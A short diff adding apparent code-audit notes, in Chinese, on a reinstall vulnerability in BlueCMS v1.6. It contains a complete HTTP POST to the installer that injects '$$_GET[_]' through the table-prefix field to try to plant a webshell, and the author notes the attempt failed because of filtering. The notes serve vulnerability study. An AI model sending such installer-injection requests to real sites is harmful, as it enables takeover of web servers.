@@ -1,0 +1,22 @@
+1.重装漏洞 过滤了特殊字符没没写shell。。。（是mysql带入库的时候过滤掉了）
+POST /uploads/install/index.php?act=step4 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 175
+Cache-Control: max-age=0
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://127.0.0.1/uploads/install/index.php?act=step3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=ckmi3slibob1f70ke38qesnae7
+Connection: close
+
+dbhost=localhost&dbname=bluecms&dbuser=root&dbpass=root&pre=%24%24_GET%5b_%5d&admin_name=admin&admin_pwd=admin&admin_pwd1=admin&admin_email=fuck%40qq.com&cookie_hash=LpAOf843D
+
+详细文章：https://blog.szfszf.top/tech/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-bluecms-v1-6/
+
+
+自己还是不是很熟练，啧。。。
